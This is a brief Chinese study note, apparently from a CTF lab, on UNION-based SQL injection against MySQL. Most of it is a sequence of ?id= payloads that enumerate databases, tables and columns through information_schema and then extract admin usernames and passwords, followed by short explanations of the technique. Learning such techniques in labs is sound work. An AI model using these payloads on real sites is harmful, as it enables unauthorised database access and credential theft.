# sql 注入：
https://www.cnblogs.com/nmlwh/p/14724551.html

 1 暴库：（information_schema,ctftraining,mysql,performance_schema,test,news）
 2 ?id=-1 UNION SELECT 1,group_concat(schema_name) from information_schema.schemata
 3 
 4 暴表：（admin,contents）
 5 ?id=-1 UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema="news"
 6 
 7 暴字段：（id,username,password）
 8 ?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name="admin"
 9 
10 暴密码：
11 ?id=-1 UNION SELECT 1,concat(username,0x3a,password) from admin

----
information_schema 是一个mysql的最重要库，包含很多信息。
SELECT 1占位，为了填充到两格子
-1 是为了不让搜索的占位
## schema ->tables -> columns
table_schema :隶属哪个库
table_name：隶属哪张表